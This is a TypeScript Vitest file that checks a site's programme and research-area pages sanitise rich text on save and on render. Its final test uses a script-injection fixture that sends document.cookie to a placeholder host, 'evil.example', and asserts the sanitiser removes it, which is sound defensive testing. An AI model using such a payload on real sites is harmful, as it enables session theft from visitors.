import { readFileSync } from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { renderRichText } from "@/lib/sanitize-html";

/**
 * Same wiring guard as src/app/(site)/__tests__/render-sanitization.test.ts
 * (Stage 05), extended to the Stage 06 public render sites: a script
 * payload in a programme or research area body must be neutralised both
 * on save (sanitizeRichText, called from the server actions) and on
 * render (renderRichText, called here).
 */

const PROGRAMME_SOURCE = readFileSync(
  path.join(process.cwd(), "src/app/(site)/programmes/[level]/page.tsx"),
  "utf8",
);
const RESEARCH_AREA_SOURCE = readFileSync(
  path.join(process.cwd(), "src/app/(site)/research/[slug]/page.tsx"),
  "utf8",
);
const SAVE_PROGRAMME_SOURCE = readFileSync(
  path.join(process.cwd(), "src/server/actions/programmes.ts"),
  "utf8",
);
const SAVE_RESEARCH_AREA_SOURCE = readFileSync(
  path.join(process.cwd(), "src/server/actions/research-areas.ts"),
  "utf8",
);

describe("programme and research area render sites use renderRichText", () => {
  it("the programme page wraps body in renderRichText", () => {
    expect(PROGRAMME_SOURCE).toMatch(/renderRichText\(programme\.body\)/);
  });

  it("the programme page wraps admissionRequirements in renderRichText", () => {
    expect(PROGRAMME_SOURCE).toMatch(/renderRichText\(programme\.admissionRequirements\)/);
  });

  it("the research area page wraps body in renderRichText", () => {
    expect(RESEARCH_AREA_SOURCE).toMatch(/renderRichText\(area\.body\)/);
  });
});

describe("save actions sanitize rich text fields before they reach the database", () => {
  it("saveProgrammeAction sanitizes body and admissionRequirements", () => {
    expect(SAVE_PROGRAMME_SOURCE).toMatch(/sanitizeRichText\(data\.body\)/);
    expect(SAVE_PROGRAMME_SOURCE).toMatch(/sanitizeRichText\(data\.admissionRequirements\)/);
  });

  it("the research area actions sanitize body", () => {
    expect(SAVE_RESEARCH_AREA_SOURCE).toMatch(/sanitizeRichText\(parsed\.data\.body\)/);
  });
});

describe("renderRichText strips a script payload from programme/research area style content", () => {
  it("strips a <script> tag embedded in a body field", () => {
    const stored = '<p>Overview</p><script>fetch("https://evil.example/steal?c="+document.cookie)</script>';
    const output = renderRichText(stored);
    expect(output).not.toMatch(/<script/i);
    expect(output).not.toContain("evil.example");
    expect(output).toContain("Overview");
  });
});
